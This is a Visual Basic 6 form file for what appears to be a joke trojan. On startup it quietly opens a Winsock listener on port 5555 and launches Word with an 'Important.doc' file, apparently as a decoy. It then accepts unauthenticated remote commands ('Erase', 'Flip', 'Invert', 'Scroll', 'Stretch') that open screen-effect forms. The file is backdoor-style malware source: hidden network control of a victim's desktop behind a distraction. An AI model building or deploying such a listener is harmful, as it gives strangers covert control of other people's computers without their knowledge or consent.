VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form MainForm 
   BackColor       =   &H00404040&
   Caption         =   "wsServer"
   ClientHeight    =   3855
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5220
   Icon            =   "Desk.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3855
   ScaleWidth      =   5220
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock wsClient 
      Left            =   360
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wsServer 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      BorderStyle     =   1  'Fixed Single
      Caption         =   $"Desk.frx":08CA
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3135
      Left            =   480
      TabIndex        =   0
      Top             =   360
      Width           =   4215
   End
End
Attribute VB_Name = "MainForm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Sub Form_Load()
    On Error Resume Next
    Dim i As Long
    wsServer(0).LocalPort = 5555
    wsServer(0).Listen
    i = Shell("c:\program files\microsoft Office\Office10\winword.exe" & " " & "c:\desktop\Important.doc", vbMaximizedFocus)
End Sub

Private Sub wsServer_Close(Index As Integer)
End
End Sub

Private Sub wsServer_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Load wsServer(Index + 1)
wsServer(Index + 1).Accept requestID
End Sub

Private Sub wsServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    Dim strRecivedData As String
    Dim SocketCheck As Integer
    wsServer(Index).GetData strRecivedData
    Debug.Print strRecivedData
         If strRecivedData = "Erase" Then
            Erase1.Show
         ElseIf strRecivedData = "Flip" Then
            Flip.Show
         ElseIf strRecivedData = "Invert" Then
            Invert.Show
         ElseIf strRecivedData = "Scroll" Then
            Scroll.Show
         ElseIf strRecivedData = "Stretch" Then
            Stretch.Show
         End If
         strRecivedData = ""
End Sub

